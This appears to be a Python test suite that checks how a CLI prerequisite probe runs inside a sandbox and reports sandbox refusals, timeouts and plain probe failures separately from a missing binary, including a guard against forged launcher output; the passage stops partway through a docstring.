"""Kiro CLI prerequisite tests: the sandboxed probe spawn, and telling its failures apart.

Wrapper resolution, sandbox preparation off the event loop and under cancellation, and how
a sandbox that cannot start, a probe that times out or a probe that fails on its own is
reported, none of which is a missing binary.
"""

from __future__ import annotations

import asyncio
import os
import subprocess
import sys
import threading
from pathlib import Path
from typing import Any
from unittest.mock import AsyncMock

import pytest
from kiro_prerequisite_helpers import _agents_dir_never_the_real_home  # noqa: F401
from kiro_prerequisite_helpers import _isolate_agent_specs  # noqa: F401
from kiro_prerequisite_helpers import _make_executable, _no_audit

from kiro_crew import kiro_prerequisite as prerequisite_module
from kiro_crew import platform_compat
from kiro_crew.kiro_prerequisite import KiroPrerequisiteService, ProcessResult, _run_process


class TestKiroPrerequisiteWorkflowSandbox:
    @pytest.mark.skipif(
        platform_compat.IS_WINDOWS,
        reason="Windows accepts only the fixed Program Files candidate",
    )
    @pytest.mark.asyncio
    async def test_probe_process_routes_planted_binary_through_sandbox(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        captured: dict[str, Any] = {}

        class _EmptyStream:
            async def read(self, _size: int) -> bytes:
                return b""

        class _Process:
            pid = 4321
            returncode: int | None = None
            stdout = _EmptyStream()
            stderr = _EmptyStream()

            async def wait(self) -> int:
                self.returncode = 0
                return 0

        def sandbox(
            argv: list[str],
            **kwargs: Any,
        ) -> tuple[list[str], dict[str, str], None]:
            captured["sandbox_argv"] = argv
            captured["sandbox_kwargs"] = kwargs
            return ["/sandbox/launcher", *argv], {"PATH": "/sandbox"}, None

        async def spawn(*argv: str, **kwargs: Any) -> _Process:
            captured["spawn_argv"] = list(argv)
            captured["spawn_kwargs"] = kwargs
            return _Process()

        monkeypatch.setattr(
            "kiro_crew.kiro_prerequisite.sandboxed_spawn_argv",
            sandbox,
        )
        monkeypatch.setattr(asyncio, "create_subprocess_exec", spawn)
        monkeypatch.setattr(
            prerequisite_module,
            "_PROCESS_GROUP_SUPERVISOR",
            "/tmp/agent-replaced-supervisor.py",
        )

        result = await _run_process(
            "/tmp/agent-writable/kiro-cli",
            ["--version"],
            env={"PATH": "/tmp/agent-writable"},
            timeout_secs=1,
        )

        assert result.ok is True
        assert captured["sandbox_argv"] == [
            "/usr/bin/env",
            "/tmp/agent-writable/kiro-cli",
            "--version",
        ]
        assert captured["sandbox_kwargs"] == {
            "mode": "strict",
            "env": {"PATH": "/tmp/agent-writable"},
            "strip_python_env": True,
            "extra_hidden_dirs": (),
            "extra_visible_dirs": (),
        }
        assert captured["spawn_argv"] == [
            sys.executable,
            "-I",
            "-c",
            prerequisite_module._PROCESS_GROUP_SUPERVISOR_CODE,
            # Resource limits ride on the supervisor's argv, not preexec_fn.
            *prerequisite_module.resource_limit_supervisor_argv(),
            "/sandbox/launcher",
            "/usr/bin/env",
            "/tmp/agent-writable/kiro-cli",
            "--version",
        ]
        assert prerequisite_module._PROCESS_GROUP_SUPERVISOR not in captured["spawn_argv"]

    @pytest.mark.skipif(
        platform_compat.IS_WINDOWS,
        reason="Windows does not use the POSIX process-group supervisor",
    )
    @pytest.mark.asyncio
    async def test_missing_process_group_supervisor_fails_before_spawn(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        spawn = AsyncMock(side_effect=OSError("empty supervisor was spawned"))
        monkeypatch.setattr(prerequisite_module, "_PROCESS_GROUP_SUPERVISOR_CODE", "")
        monkeypatch.setattr(asyncio, "create_subprocess_exec", spawn)

        result = await _run_process(
            "/fixed/kiro-cli",
            ["--version"],
            env={"PATH": "/usr/bin:/bin"},
            timeout_secs=1,
        )

        assert result.ok is False
        assert result.error == "Kiro process-group supervisor is unavailable"
        spawn.assert_not_awaited()

    @pytest.mark.skipif(
        platform_compat.IS_WINDOWS,
        reason="Windows does not use the POSIX process-group supervisor",
    )
    @pytest.mark.parametrize("wrapper", ("env", "systemd-run"))
    @pytest.mark.asyncio
    async def test_probe_resolves_sandbox_wrapper_before_supervisor_exec(
        self,
        wrapper: str,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        captured: dict[str, Any] = {}

        class _EmptyStream:
            async def read(self, _size: int) -> bytes:
                return b""

        class _Process:
            pid = 4321
            returncode: int | None = None
            stdout = _EmptyStream()
            stderr = _EmptyStream()

            async def wait(self) -> int:
                self.returncode = 0
                return 0

        def sandbox(
            argv: list[str],
            **_kwargs: Any,
        ) -> tuple[list[str], dict[str, str], None]:
            return [wrapper, *argv], {"PATH": "/trusted/bin"}, None

        def trusted(name: str) -> str:
            assert name == wrapper
            return f"/usr/bin/{wrapper}"

        async def spawn(*argv: str, **_kwargs: Any) -> _Process:
            captured["spawn_argv"] = list(argv)
            return _Process()

        monkeypatch.setattr(prerequisite_module, "sandboxed_spawn_argv", sandbox)
        monkeypatch.setattr(
            prerequisite_module.platform_compat,
            "trusted_system_bin",
            trusted,
        )
        monkeypatch.setattr(asyncio, "create_subprocess_exec", spawn)

        result = await _run_process(
            "/fixed/kiro-cli",
            ["--version"],
            env={"PATH": "/trusted/bin"},
            timeout_secs=1,
        )

        assert result.ok is True
        # 4 supervisor items (python, -I, -c, code) plus the optional --rlimits=
        # fragment, then the resolved sandbox wrapper.
        wrapper_index = 4 + len(prerequisite_module.resource_limit_supervisor_argv())
        assert captured["spawn_argv"][wrapper_index] == f"/usr/bin/{wrapper}"

    @pytest.mark.skipif(
        platform_compat.IS_WINDOWS,
        reason="Windows does not wrap the probe in the POSIX sandbox launcher",
    )
    @pytest.mark.asyncio
    async def test_probe_reports_an_unresolvable_sandbox_wrapper(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        # A wrapper the pin cannot resolve fails with a named cause rather than
        # falling back to whatever PATH offers.

        def sandbox(
            argv: list[str],
            **_kwargs: Any,
        ) -> tuple[list[str], dict[str, str], None]:
            return ["systemd-run", *argv], {"PATH": "/trusted/bin"}, None

        spawn = AsyncMock(side_effect=OSError("an unresolvable wrapper was spawned"))
        monkeypatch.setattr(prerequisite_module, "sandboxed_spawn_argv", sandbox)
        monkeypatch.setattr(
            prerequisite_module.platform_compat,
            "trusted_system_bin",
            lambda _name: None,
        )
        monkeypatch.setattr(asyncio, "create_subprocess_exec", spawn)

        result = await _run_process(
            "/fixed/kiro-cli",
            ["--version"],
            env={"PATH": "/trusted/bin"},
            timeout_secs=1,
        )

        assert result.ok is False
        assert result.error == "sandbox wrapper is unavailable: systemd-run"
        spawn.assert_not_awaited()

    @pytest.mark.skipif(
        platform_compat.IS_WINDOWS,
        reason="Windows does not wrap the probe in the POSIX sandbox launcher",
    )
    @pytest.mark.asyncio
    async def test_wrapper_resolution_does_not_block_event_loop(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        # A miss walks the whole PATH to report where the tool is, so the lookup
        # has to run off the loop or a stalled mount freezes the gateway.
        lookup_started = threading.Event()
        release_lookup = threading.Event()

        def sandbox(
            argv: list[str],
            **_kwargs: Any,
        ) -> tuple[list[str], dict[str, str], None]:
            return ["systemd-run", *argv], {"PATH": "/trusted/bin"}, None

        def slow_lookup(_name: str) -> str | None:
            lookup_started.set()
            assert release_lookup.wait(timeout=1)
            return "/usr/bin/systemd-run"

        monkeypatch.setattr(prerequisite_module, "sandboxed_spawn_argv", sandbox)
        monkeypatch.setattr(
            prerequisite_module.platform_compat,
            "trusted_system_bin",
            slow_lookup,
        )
        monkeypatch.setattr(
            asyncio,
            "create_subprocess_exec",
            AsyncMock(side_effect=OSError("spawn is not the subject here")),
        )

        process_task = asyncio.create_task(
            _run_process(
                "/fixed/kiro-cli",
                ["--version"],
                env={"PATH": "/trusted/bin"},
                timeout_secs=1,
            )
        )
        assert await asyncio.to_thread(lookup_started.wait, 1)
        ticked_during_lookup = False

        async def tick_lookup() -> None:
            nonlocal ticked_during_lookup
            await asyncio.sleep(0)
            ticked_during_lookup = True

        await tick_lookup()
        assert ticked_during_lookup
        release_lookup.set()
        assert (await process_task).ok is False

    @pytest.mark.skipif(
        platform_compat.IS_WINDOWS,
        reason="Windows does not create a POSIX sandbox launcher",
    )
    @pytest.mark.asyncio
    async def test_sandbox_preparation_and_cleanup_do_not_block_event_loop(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        preparation_started = threading.Event()
        release_preparation = threading.Event()
        cleanup_started = threading.Event()
        release_cleanup = threading.Event()
        cleanup_path = tmp_path / "sandbox-profile"
        cleanup_path.write_text("profile", encoding="utf-8")
        real_unlink = os.unlink

        class _EmptyStream:
            async def read(self, _size: int) -> bytes:
                return b""

        class _Process:
            pid = 4321
            returncode: int | None = None
            stdout = _EmptyStream()
            stderr = _EmptyStream()

            async def wait(self) -> int:
                self.returncode = 0
                return 0

        def sandbox(
            argv: list[str],
            **_kwargs: Any,
        ) -> tuple[list[str], dict[str, str], str]:
            preparation_started.set()
            assert release_preparation.wait(timeout=1)
            return argv, {}, str(cleanup_path)

        def slow_unlink(path: str) -> None:
            if path == str(cleanup_path):
                cleanup_started.set()
                assert release_cleanup.wait(timeout=1)
            real_unlink(path)

        async def spawn(*_argv: str, **_kwargs: Any) -> _Process:
            return _Process()

        monkeypatch.setattr(prerequisite_module, "sandboxed_spawn_argv", sandbox)
        monkeypatch.setattr(prerequisite_module.os, "unlink", slow_unlink)
        monkeypatch.setattr(asyncio, "create_subprocess_exec", spawn)

        process_task = asyncio.create_task(
            _run_process(
                "/fixed/tool",
                ["--version"],
                env={},
                timeout_secs=1,
            )
        )
        assert await asyncio.to_thread(preparation_started.wait, 1)
        ticked_during_preparation = False

        async def tick_preparation() -> None:
            nonlocal ticked_during_preparation
            await asyncio.sleep(0)
            ticked_during_preparation = True

        await tick_preparation()
        assert ticked_during_preparation
        release_preparation.set()
        assert await asyncio.to_thread(cleanup_started.wait, 1)
        ticked_during_cleanup = False

        async def tick_cleanup() -> None:
            nonlocal ticked_during_cleanup
            await asyncio.sleep(0)
            ticked_during_cleanup = True

        await tick_cleanup()
        assert ticked_during_cleanup
        release_cleanup.set()
        assert (await process_task).ok is True

    @pytest.mark.asyncio
    async def test_cancelled_sandbox_preparation_unlinks_the_launcher(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """First-cancellation semantics: the recovery waits for the worker to
        settle, removes the launcher it materialized, and re-raises."""
        preparation_started = threading.Event()
        release_preparation = threading.Event()
        cleanup_path = tmp_path / "sandbox-launcher"
        cleanup_path.write_text("launcher", encoding="utf-8")

        def sandbox(
            argv: list[str],
            **_kwargs: Any,
        ) -> tuple[list[str], dict[str, str], str]:
            preparation_started.set()
            assert release_preparation.wait(timeout=5)
            return argv, {}, str(cleanup_path)

        monkeypatch.setattr(prerequisite_module, "sandboxed_spawn_argv", sandbox)

        outer = asyncio.create_task(
            prerequisite_module._prepare_sandboxed_spawn(
                ["/fixed/tool"],
                mode=prerequisite_module._UNVERIFIED_SANDBOX_MODE,
                env={},
                extra_hidden_dirs=(),
                extra_visible_dirs=(),
            )
        )
        assert await asyncio.to_thread(preparation_started.wait, 5)
        outer.cancel()
        await asyncio.sleep(0)
        release_preparation.set()
        with pytest.raises(asyncio.CancelledError):
            await outer
        assert not cleanup_path.exists()

    @pytest.mark.asyncio
    async def test_repeat_cancellation_in_sandbox_recovery_still_unlinks(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """A REPEAT cancellation landing on the recovery await is a
        ``BaseException``, so it escaped the old ``suppress(Exception)``
        before ``_unlink_off_loop`` ran, leaking the materialized launcher.
        The recovery must absorb repeat cancellations in BOTH of
        its phases — while the worker settles and while the unlink runs —
        still remove the launcher, and let the ORIGINAL cancellation (pinned
        by its message) propagate rather than a repeat."""
        preparation_started = threading.Event()
        release_preparation = threading.Event()
        unlink_started = threading.Event()
        release_unlink = threading.Event()
        cleanup_path = tmp_path / "sandbox-launcher"
        cleanup_path.write_text("launcher", encoding="utf-8")
        real_unlink = os.unlink

        def sandbox(
            argv: list[str],
            **_kwargs: Any,
        ) -> tuple[list[str], dict[str, str], str]:
            preparation_started.set()
            assert release_preparation.wait(timeout=5)
            return argv, {}, str(cleanup_path)

        def slow_unlink(path: str) -> None:
            if path == str(cleanup_path):
                unlink_started.set()
                assert release_unlink.wait(timeout=5)
            real_unlink(path)

        monkeypatch.setattr(prerequisite_module, "sandboxed_spawn_argv", sandbox)
        monkeypatch.setattr(prerequisite_module.os, "unlink", slow_unlink)

        outer = asyncio.create_task(
            prerequisite_module._prepare_sandboxed_spawn(
                ["/fixed/tool"],
                mode=prerequisite_module._UNVERIFIED_SANDBOX_MODE,
                env={},
                extra_hidden_dirs=(),
                extra_visible_dirs=(),
            )
        )
        assert await asyncio.to_thread(preparation_started.wait, 5)
        # First cancellation: delivered at the shielded hop; the coroutine
        # enters its recovery block. Its message pins exception identity: if
        # a repeat cancellation were the one to propagate (or to merge into
        # the first delivery), the message assertion below goes red.
        outer.cancel("original-cancellation-5841")
        await asyncio.sleep(0)
        await asyncio.sleep(0)
        # REPEAT cancellation while the worker is still settling — the
        # launcher must still exist for the repeat to be able to leak it.
        assert cleanup_path.exists()
        outer.cancel()
        await asyncio.sleep(0)
        release_preparation.set()
        # REPEAT cancellation while the unlink itself is in flight.
        assert await asyncio.to_thread(unlink_started.wait, 5)
        assert cleanup_path.exists()
        outer.cancel()
        await asyncio.sleep(0)
        release_unlink.set()
        with pytest.raises(asyncio.CancelledError) as exc_info:
            await outer
        # The coroutine's actual exception object propagates, so the original
        # cancel message survives the message-less repeats above.
        assert exc_info.value.args == ("original-cancellation-5841",)
        assert not cleanup_path.exists()


class TestSandboxUnavailableIsNotAMissingBinary:
    """A sandbox-refused probe must not be reported as "not installed".

    Verification runs the candidate INSIDE the sandbox
    (``_UNVERIFIED_SANDBOX_MODE``), so on a host where the sandbox cannot be
    constructed — Ubuntu >= 23.10 with
    ``kernel.apparmor_restrict_unprivileged_userns=1`` is the common case — a
    present, executable, already-authenticated CLI fails verification. The old
    code degraded that to ``installed=False``, telling the user to install a CLI
    that was already there.

    Every case here drives the decision through ``ProcessResult.sandbox_failure``
    — the typed signal the spawn itself produced — so the outcome does not depend
    on whether the machine running the tests happens to have a working sandbox.
    """

    @staticmethod
    def _service(tmp_path: Path, run: Any) -> KiroPrerequisiteService:
        return KiroPrerequisiteService(
            platform_name="linux",
            environ={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
            home=tmp_path,
            process_runner=run,
            audit_writer=_no_audit,
        )

    @staticmethod
    def _sandbox_refused(kind: str, detail: str, remedy: str = "") -> Any:
        """A runner standing in for wrap_argv fail-closing on this spawn."""

        async def run(_command: str, _args: list[str], **_kwargs: Any) -> ProcessResult:
            return ProcessResult(
                ok=False,
                error=f"Sandbox backend unavailable ... Probe detail: {detail}.",
                sandbox_failure=(kind, detail, remedy),
            )

        return run

    @staticmethod
    async def _plain_failure(
        _command: str,
        _args: list[str],
        **_kwargs: Any,
    ) -> ProcessResult:
        """A probe that failed for a reason unrelated to the sandbox."""
        return ProcessResult(ok=False, error="exited with code 1")

    @pytest.mark.asyncio
    async def test_present_binary_reports_sandbox_unavailable_not_missing(
        self,
        tmp_path: Path,
    ) -> None:
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")
        detail = "unshare(CLONE_NEWNS) failed with errno 1 (EPERM)"

        status = await self._service(
            tmp_path, self._sandbox_refused("no_backend", detail)
        ).snapshot(force=True)

        assert status["sandbox_unavailable"] is True
        assert status["sandbox_failure_kind"] == "no_backend"
        assert status["sandbox_detail"] == detail
        # The whole point: the binary is on disk and executable, so claiming it
        # is not installed is the bug being fixed.
        assert status["installed"] is True
        assert status["ready"] is False
        # Signing in cannot fix a missing sandbox backend, so an action that
        # cannot help is not offered.
        assert status["repair_required"] is False

    @pytest.mark.asyncio
    async def test_remedy_token_reaches_the_dashboard_payload(
        self,
        tmp_path: Path,
    ) -> None:
        """The mechanism the probe identified must survive to the gate screen.

        Without it the dashboard can only render ``errno 1 (EPERM)`` and a retry
        button, which is the dead end this guards against: the probe already
        knows the fix is an AppArmor profile and the user has no way to learn it.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")
        detail = "unshare(CLONE_NEWNS) failed with errno 1 (EPERM)"

        status = await self._service(
            tmp_path, self._sandbox_refused("no_backend", detail, "apparmor_userns")
        ).snapshot(force=True)

        assert status["sandbox_remedy"] == "apparmor_userns"

    @pytest.mark.asyncio
    async def test_absent_remedy_is_empty_not_missing(
        self,
        tmp_path: Path,
    ) -> None:
        """Shape stability: the key is always present, even with no mechanism.

        The gate reads it unconditionally, so an absent key would make the field
        ``undefined`` and select a remedy branch by accident.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        status = await self._service(
            tmp_path, self._sandbox_refused("no_backend", "not Linux")
        ).snapshot(force=True)

        assert status["sandbox_remedy"] == ""

    @pytest.mark.asyncio
    async def test_missing_binary_still_reports_not_installed(
        self,
        tmp_path: Path,
    ) -> None:
        """The genuine missing-binary path must be untouched by this change."""
        status = await self._service(tmp_path, self._plain_failure).snapshot(force=True)

        assert status["installed"] is False
        assert status["sandbox_unavailable"] is False
        assert status["sandbox_failure_kind"] == ""

    @pytest.mark.asyncio
    async def test_probe_failure_unrelated_to_the_sandbox_is_not_misattributed(
        self,
        tmp_path: Path,
    ) -> None:
        """A present binary that simply fails --version is NOT a sandbox problem.

        This is the over-claim guard, and it is what keeps the fix honest on
        platforms where verification is not sandboxed at all: ``_run_process``
        skips the wrap on Windows, and ``sandbox_allow_unsandboxed_exec``
        bypasses it, so a broken CLI there must keep its repair path instead of
        being blamed on the sandbox.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        status = await self._service(tmp_path, self._plain_failure).snapshot(force=True)

        assert status["sandbox_unavailable"] is False
        assert status["sandbox_failure_kind"] == ""
        assert status["installed"] is False

    @pytest.mark.asyncio
    async def test_transient_failure_is_reported_as_transient(
        self,
        tmp_path: Path,
    ) -> None:
        """A transient refusal must be distinguishable from a host verdict.

        The remedy differs sharply: retry, versus change the host. Reporting a
        momentary EAGAIN as "this host has no sandbox" is what would push a user
        into needlessly disabling their own isolation.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        status = await self._service(
            tmp_path, self._sandbox_refused("transient", "fork failed with errno 11 (EAGAIN)")
        ).snapshot(force=True)

        assert status["sandbox_unavailable"] is True
        assert status["sandbox_failure_kind"] == "transient"
        assert status["installed"] is True

    @pytest.mark.asyncio
    async def test_working_host_sets_no_sandbox_fields(
        self,
        tmp_path: Path,
    ) -> None:
        """The healthy path must leave every new field at its default."""
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        async def run(_command: str, args: list[str], **_kwargs: Any) -> ProcessResult:
            return ProcessResult(ok=args == ["--version"])

        status = await self._service(tmp_path, run).snapshot(force=True)

        assert status["installed"] is True
        assert status["sandbox_unavailable"] is False
        assert status["sandbox_failure_kind"] == ""
        assert status["sandbox_detail"] == ""
        assert status["probe_timed_out"] is False

    # The line the Linux launcher writes when a container grants both namespaces
    # and refuses its first mount (the runtime's default AppArmor profile).
    _LAUNCHER_MOUNT_REFUSED = (
        "sandbox: BLOCKED -- making mount propagation private on / failed: errno 13 "
        "(Permission denied). The sandbox could not establish this control, so the "
        "agent would run with the path visible. Lower agent.sandbox "
        "to run without this control deliberately."
    )

    @staticmethod
    def _fake_spawn(monkeypatch: pytest.MonkeyPatch, stderr: bytes, returncode: int) -> None:
        """A spawned child that writes *stderr* and exits *returncode*, unsandboxed.

        The sandbox wrapper is stubbed to a passthrough so the test drives the
        classification of the child's OUTPUT, not the host's ability to build a
        sandbox.
        """

        class _Stream:
            def __init__(self, data: bytes) -> None:
                self._data = data

            async def read(self, _size: int) -> bytes:
                data, self._data = self._data, b""
                return data

        class _Process:
            pid = 4321
            returncode: int | None = None

            def __init__(self) -> None:
                self.stdout = _Stream(b"")
                self.stderr = _Stream(stderr)

            async def wait(self) -> int:
                self.returncode = returncode
                return returncode

        async def spawn(*_argv: str, **_kwargs: Any) -> _Process:
            return _Process()

        monkeypatch.setattr(
            "kiro_crew.kiro_prerequisite.sandboxed_spawn_argv",
            lambda argv, **_k: (list(argv), {}, None),
        )
        monkeypatch.setattr(asyncio, "create_subprocess_exec", spawn)

    @pytest.mark.skipif(platform_compat.IS_WINDOWS, reason="no launcher runs on Windows")
    @pytest.mark.asyncio
    async def test_a_launcher_refusal_after_the_spawn_is_a_typed_sandbox_failure(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The second structural source of ``sandbox_failure``.

        ``wrap_argv`` raises when the sandbox cannot be built BEFORE the spawn. A
        host that passed the boot probe can still refuse a control at spawn time,
        and that reaches here only as exit 1 plus the launcher's own line on
        stderr -- indistinguishable from a broken candidate unless the line is
        recognized. The candidate's line only triggers a fresh trusted launcher
        run; the triple reported is that run's, so the child's text chooses
        neither the detail nor the remedy the gate shows.
        """
        verdict = ("no_backend", "failed to install seccomp-BPF filter (prctl returned 1)", "")
        seen: list[str] = []

        def fake_corroborate(output: str, **_kwargs: object) -> tuple[str, str, str]:
            seen.append(output)
            return verdict

        monkeypatch.setattr(
            "kiro_crew.kiro_prerequisite.corroborate_launcher_refusal", fake_corroborate
        )
        self._fake_spawn(monkeypatch, self._LAUNCHER_MOUNT_REFUSED.encode(), 1)

        result = await _run_process(
            "/opt/kiro/kiro-cli", ["--version"], env={"PATH": "/usr/bin"}, timeout_secs=1
        )

        assert result.ok is False
        assert result.sandbox_failure == verdict
        assert seen == [result.output], "the candidate's own output triggers the corroboration"

    @pytest.mark.skipif(platform_compat.IS_WINDOWS, reason="no launcher runs on Windows")
    @pytest.mark.asyncio
    async def test_a_forged_refusal_line_cannot_become_a_verdict(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The candidate IS the unverified binary; its stderr can carry the launcher's line.

        With the trusted launcher run still building the sandbox and exiting 0,
        that line is the child's text and nothing more -- no sandbox verdict, no
        remedy card, no opt-out offered. The text stays in ``output`` for the
        probe_error path.
        """
        seen: list[str] = []

        def fake_corroborate(output: str, **_kwargs: object) -> None:
            seen.append(output)
            return None

        monkeypatch.setattr(
            "kiro_crew.kiro_prerequisite.corroborate_launcher_refusal", fake_corroborate
        )
        self._fake_spawn(monkeypatch, self._LAUNCHER_MOUNT_REFUSED.encode(), 1)

        result = await _run_process(
            "/tmp/planted/kiro-cli", ["--version"], env={"PATH": "/tmp/planted"}, timeout_secs=1
        )

        assert result.ok is False
        assert result.sandbox_failure is None
        assert len(seen) == 1, "the line triggers exactly one corroboration"
        assert "making mount propagation private" in result.output

    @pytest.mark.skipif(platform_compat.IS_WINDOWS, reason="no launcher runs on Windows")
    @pytest.mark.asyncio
    async def test_run_process_forwards_mode_and_dirs_to_the_corroborator(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The corroborating run must confine exactly as the refused spawn did.

        The verdict is only faithful if the trusted no-op runs under the same
        ``mode`` and hidden/visible dirs, so ``_run_process`` forwards them and
        this pins that it does.
        """
        captured: dict[str, object] = {}

        def fake_corroborate(output: str, **kwargs: object) -> None:
            captured.update(kwargs)
            return None

        monkeypatch.setattr(
            "kiro_crew.kiro_prerequisite.corroborate_launcher_refusal", fake_corroborate
        )
        self._fake_spawn(monkeypatch, self._LAUNCHER_MOUNT_REFUSED.encode(), 1)

        await _run_process(
            "/opt/kiro/kiro-cli",
            ["--version"],
            env={"PATH": "/usr/bin"},
            timeout_secs=1,
            sandbox_mode="standard",
            extra_hidden_dirs=("/home/dev/.aws",),
            extra_visible_dirs=("/home/dev/.config/kiro",),
        )

        assert captured == {
            "mode": "standard",
            "extra_hidden_dirs": ("/home/dev/.aws",),
            "extra_visible_dirs": ("/home/dev/.config/kiro",),
        }

    @pytest.mark.skipif(platform_compat.IS_WINDOWS, reason="no launcher runs on Windows")
    @pytest.mark.asyncio
    async def test_a_candidate_that_fails_on_its_own_stays_untyped(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        self._fake_spawn(monkeypatch, b"error: unrecognized option '--version'\n", 2)

        result = await _run_process(
            "/opt/kiro/kiro-cli", ["--version"], env={"PATH": "/usr/bin"}, timeout_secs=1
        )

        assert result.ok is False
        assert result.sandbox_failure is None
        assert "unrecognized option" in result.output

    @pytest.mark.skipif(platform_compat.IS_WINDOWS, reason="the POSIX spawn path is under test")
    @pytest.mark.asyncio
    async def test_off_linux_a_launcher_line_is_the_candidates_own_text(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """macOS: the launcher is Seatbelt, which never writes these lines.

        A matching line there can only be the child's own text, and the
        Linux-only launcher run would refuse for reasons of its own -- so the
        corroborator runs nothing and sets no verdict.
        """
        from kiro_crew import sandbox as sandbox_module

        ran: list[int] = []
        monkeypatch.setattr(sandbox_module.sys, "platform", "darwin")
        monkeypatch.setattr(
            sandbox_module,
            "run_limited",
            lambda argv, **kwargs: ran.append(1) or subprocess.CompletedProcess(argv, 1, "", ""),
        )
        self._fake_spawn(monkeypatch, self._LAUNCHER_MOUNT_REFUSED.encode(), 1)

        result = await _run_process(
            "/opt/kiro/kiro-cli", ["--version"], env={"PATH": "/usr/bin"}, timeout_secs=1
        )

        assert result.ok is False
        assert result.sandbox_failure is None
        assert ran == []

    @pytest.mark.asyncio
    async def test_a_sandbox_line_on_windows_is_the_candidates_own_text(
        self,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """No launcher runs on Windows, so the prefix there cannot be a verdict."""

        async def descendants(
            _root_pid: int,
            _retained_handles: dict[int, int] | None = None,
            _root_handle: int | None = None,
        ) -> dict[int, int]:
            await asyncio.sleep(0)
            return {}

        monkeypatch.setattr(platform_compat, "duplicate_asyncio_process_handle", lambda _p: 8001)
        monkeypatch.setattr(platform_compat, "descendant_termination_handles_async", descendants)
        monkeypatch.setattr(platform_compat, "process_handle_active", lambda _handle: False)
        monkeypatch.setattr(platform_compat, "close_process_handle", lambda _handle: None)
        monkeypatch.setattr(platform_compat, "IS_POSIX", False)
        monkeypatch.setattr(platform_compat, "IS_WINDOWS", True)
        self._fake_spawn(monkeypatch, self._LAUNCHER_MOUNT_REFUSED.encode(), 1)

        result = await _run_process(r"C:\fixed\kiro-cli.exe", ["--version"], env={}, timeout_secs=1)

        assert result.ok is False
        assert result.sandbox_failure is None

    @pytest.mark.asyncio
    async def test_a_present_binary_refused_by_the_launcher_is_not_missing(
        self,
        tmp_path: Path,
    ) -> None:
        """End to end through the status: the container case as the gate sees it.

        This is the misdiagnosis the issue reported — CLI installed and signed in,
        the launcher's first mount refused by the container, status says "not
        installed" and every gated endpoint answers 503. The detail is the
        corroborating probe's reason, never the child's line.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")
        detail = "mount(MS_REC|MS_PRIVATE) on / failed with errno 13 (EACCES)"

        status = await self._service(
            tmp_path,
            self._sandbox_refused("no_backend", detail, "mount_denied"),
        ).snapshot(force=True)

        assert status["installed"] is True
        assert status["sandbox_unavailable"] is True
        assert status["sandbox_failure_kind"] == "no_backend"
        assert status["sandbox_detail"] == detail
        assert status["sandbox_remedy"] == "mount_denied"
        assert status["ready"] is False
        assert status["repair_required"] is False


class TestTimedOutProbeIsNotAMissingBinary:
    """A probe that never ANSWERED must not be reported as "not installed".

    The third condition. The sandbox branch
    keys on a typed ``sandbox_failure``; a timeout raises none, so the timed-out
    probe fell through to a bare ``PrerequisiteStatus`` whose every field is a
    default: ``installed=False``, ``sandbox_unavailable=False`` and all
    ``sandbox_*`` empty. That combination is worse than unhelpful — it rules the
    true cause OUT, and points the operator at reinstalling or re-signing-in a CLI
    that is installed, signed in, and serving chat turns the entire time.

    Driven through ``ProcessResult.timed_out`` (the flag ``_run_process`` already
    sets on the timeout path, and which the SEL audit already records as
    ``error=timeout``) so no test here depends on real wall-clock timing.
    """

    @staticmethod
    def _service(tmp_path: Path, run: Any) -> KiroPrerequisiteService:
        return KiroPrerequisiteService(
            platform_name="linux",
            environ={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
            home=tmp_path,
            process_runner=run,
            audit_writer=_no_audit,
        )

    @staticmethod
    async def _timed_out(
        _command: str,
        _args: list[str],
        **_kwargs: Any,
    ) -> ProcessResult:
        """The runner shape ``_run_process`` produces when the probe never answers."""
        return ProcessResult(ok=False, error="timeout", timed_out=True)

    @pytest.mark.asyncio
    async def test_timed_out_probe_does_not_claim_the_cli_is_missing(
        self,
        tmp_path: Path,
    ) -> None:
        """The load-bearing assertion: present on disk, so NOT ``installed=False``."""
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        status = await self._service(tmp_path, self._timed_out).snapshot(force=True)

        assert status["installed"] is True
        assert status["probe_timed_out"] is True
        assert status["ready"] is False

    @pytest.mark.asyncio
    async def test_timeout_is_not_attributed_to_the_sandbox(
        self,
        tmp_path: Path,
    ) -> None:
        """Over-claim guard, and the reason this is a new field not a reused one.

        A caller that keys a userns remedy off ``sandbox_unavailable`` must not be
        handed a slow filesystem to fix with an AppArmor profile. Nothing about the
        sandbox failed here: the spawn was accepted and raised no typed failure.
        """
        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")

        status = await self._service(tmp_path, self._timed_out).snapshot(force=True)

        assert status["sandbox_unavailable"] is False
        assert status["sandbox_failure_kind"] == ""
        assert status["sandbox_detail"] == ""
        assert status["sandbox_remedy"] == ""

    @pytest.mark.asyncio
    async def test_timeout_does_not_offer_an_action_that_cannot_help(
        self,
        tmp_path: Path,
    ) -> None:
        """Neither a reinstall nor a sign-in can speed up a slow probe.

        ``authenticated`` is false as UNKNOWN, not as a verdict: ``whoami`` runs
        through the same probe path and on this host is never reached at all, which
